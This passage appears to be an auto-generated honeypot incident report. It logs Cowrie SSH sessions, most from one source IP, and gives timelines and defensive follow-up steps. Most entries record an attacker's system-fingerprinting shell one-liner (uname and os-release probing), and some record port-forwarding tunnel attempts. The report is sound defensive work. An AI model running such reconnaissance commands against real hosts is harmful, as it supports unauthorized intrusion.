| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:40 |
| **Last Seen** | 2026-07-06 15:40 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:40:31` | `cowrie.session.connect` |
| `2026-07-06 15:40:35` | `cowrie.client.version` |
| `2026-07-06 15:40:35` | `cowrie.client.kex` |
| `2026-07-06 15:40:47` | `cowrie.login.success` |
| `2026-07-06 15:40:51` | `cowrie.session.params` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:51` | `cowrie.command.success` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:51` | `cowrie.command.input` |
| `2026-07-06 15:40:55` | `cowrie.log.closed` |
| `2026-07-06 15:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f603566786e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:41 |
| **Last Seen** | 2026-07-06 15:42 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:41:51` | `cowrie.session.connect` |
| `2026-07-06 15:41:52` | `cowrie.client.version` |
| `2026-07-06 15:41:52` | `cowrie.client.kex` |
| `2026-07-06 15:41:59` | `cowrie.login.success` |
| `2026-07-06 15:42:04` | `cowrie.session.params` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:04` | `cowrie.command.success` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:04` | `cowrie.command.input` |
| `2026-07-06 15:42:06` | `cowrie.log.closed` |
| `2026-07-06 15:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6fd7331effb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:43 |
| **Last Seen** | 2026-07-06 15:43 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:43:01` | `cowrie.session.connect` |
| `2026-07-06 15:43:02` | `cowrie.client.version` |
| `2026-07-06 15:43:02` | `cowrie.client.kex` |
| `2026-07-06 15:43:09` | `cowrie.login.success` |
| `2026-07-06 15:43:12` | `cowrie.session.params` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:12` | `cowrie.command.success` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:12` | `cowrie.command.input` |
| `2026-07-06 15:43:14` | `cowrie.log.closed` |
| `2026-07-06 15:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc6706b9442

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:44 |
| **Last Seen** | 2026-07-06 15:44 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:44:13` | `cowrie.session.connect` |
| `2026-07-06 15:44:14` | `cowrie.client.version` |
| `2026-07-06 15:44:14` | `cowrie.client.kex` |
| `2026-07-06 15:44:21` | `cowrie.login.success` |
| `2026-07-06 15:44:25` | `cowrie.session.params` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:25` | `cowrie.command.success` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:25` | `cowrie.command.input` |
| `2026-07-06 15:44:28` | `cowrie.log.closed` |
| `2026-07-06 15:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e47eb3faee1e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:45 |
| **Last Seen** | 2026-07-06 15:45 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:45:19` | `cowrie.session.connect` |
| `2026-07-06 15:45:22` | `cowrie.client.version` |
| `2026-07-06 15:45:22` | `cowrie.client.kex` |
| `2026-07-06 15:45:31` | `cowrie.login.success` |
| `2026-07-06 15:45:34` | `cowrie.session.params` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:34` | `cowrie.command.success` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:34` | `cowrie.command.input` |
| `2026-07-06 15:45:36` | `cowrie.log.closed` |
| `2026-07-06 15:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6301ab85913d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 15:45 |
| **Last Seen** | 2026-07-06 15:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:45:19` | `cowrie.session.connect` |
| `2026-07-06 15:45:19` | `cowrie.client.version` |
| `2026-07-06 15:45:19` | `cowrie.client.kex` |
| `2026-07-06 15:45:19` | `cowrie.login.success` |
| `2026-07-06 15:45:20` | `cowrie.direct-tcpip.request` |
| `2026-07-06 15:45:20` | `cowrie.direct-tcpip.data` |
| `2026-07-06 15:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fde712e9adf7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:46 |
| **Last Seen** | 2026-07-06 15:46 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:46:36` | `cowrie.session.connect` |
| `2026-07-06 15:46:40` | `cowrie.client.version` |
| `2026-07-06 15:46:40` | `cowrie.client.kex` |
| `2026-07-06 15:46:47` | `cowrie.login.success` |
| `2026-07-06 15:46:52` | `cowrie.session.params` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:52` | `cowrie.command.success` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:52` | `cowrie.command.input` |
| `2026-07-06 15:46:55` | `cowrie.log.closed` |
| `2026-07-06 15:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b09b44b61115

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 15:47 |
| **Last Seen** | 2026-07-06 15:47 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:47:31` | `cowrie.session.connect` |
| `2026-07-06 15:47:33` | `cowrie.client.version` |
| `2026-07-06 15:47:33` | `cowrie.client.kex` |
| `2026-07-06 15:47:39` | `cowrie.login.success` |
| `2026-07-06 15:47:42` | `cowrie.session.params` |
| `2026-07-06 15:47:42` | `cowrie.command.input` |
| `2026-07-06 15:47:44` | `cowrie.log.closed` |
| `2026-07-06 15:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bdaae752272

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:47 |
| **Last Seen** | 2026-07-06 15:48 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:47:45` | `cowrie.session.connect` |
| `2026-07-06 15:47:49` | `cowrie.client.version` |
| `2026-07-06 15:47:49` | `cowrie.client.kex` |
| `2026-07-06 15:47:55` | `cowrie.login.success` |
| `2026-07-06 15:47:59` | `cowrie.session.params` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.command.success` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.command.input` |
| `2026-07-06 15:47:59` | `cowrie.log.closed` |
| `2026-07-06 15:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17fcb1651ef2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:48 |
| **Last Seen** | 2026-07-06 15:49 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:48:59` | `cowrie.session.connect` |
| `2026-07-06 15:49:02` | `cowrie.client.version` |
| `2026-07-06 15:49:02` | `cowrie.client.kex` |
| `2026-07-06 15:49:10` | `cowrie.login.success` |
| `2026-07-06 15:49:12` | `cowrie.session.params` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.command.success` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.command.input` |
| `2026-07-06 15:49:12` | `cowrie.log.closed` |
| `2026-07-06 15:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1956ce7f9836

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:49 |
| **Last Seen** | 2026-07-06 15:50 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:49:56` | `cowrie.session.connect` |
| `2026-07-06 15:50:01` | `cowrie.client.version` |
| `2026-07-06 15:50:01` | `cowrie.client.kex` |
| `2026-07-06 15:50:18` | `cowrie.login.success` |
| `2026-07-06 15:50:21` | `cowrie.session.params` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:21` | `cowrie.command.success` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:21` | `cowrie.command.input` |
| `2026-07-06 15:50:23` | `cowrie.log.closed` |
| `2026-07-06 15:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667427ed0488

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:51 |
| **Last Seen** | 2026-07-06 15:51 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:51:19` | `cowrie.session.connect` |
| `2026-07-06 15:51:24` | `cowrie.client.version` |
| `2026-07-06 15:51:24` | `cowrie.client.kex` |
| `2026-07-06 15:51:33` | `cowrie.login.success` |
| `2026-07-06 15:51:40` | `cowrie.session.params` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:40` | `cowrie.command.success` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:40` | `cowrie.command.input` |
| `2026-07-06 15:51:42` | `cowrie.log.closed` |
| `2026-07-06 15:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e25a15cb3d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:52 |
| **Last Seen** | 2026-07-06 15:52 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:52:27` | `cowrie.session.connect` |
| `2026-07-06 15:52:31` | `cowrie.client.version` |
| `2026-07-06 15:52:31` | `cowrie.client.kex` |
| `2026-07-06 15:52:43` | `cowrie.login.success` |
| `2026-07-06 15:52:46` | `cowrie.session.params` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:46` | `cowrie.command.success` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:46` | `cowrie.command.input` |
| `2026-07-06 15:52:49` | `cowrie.log.closed` |
| `2026-07-06 15:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c774e36edc73

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 15:53 |
| **Last Seen** | 2026-07-06 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
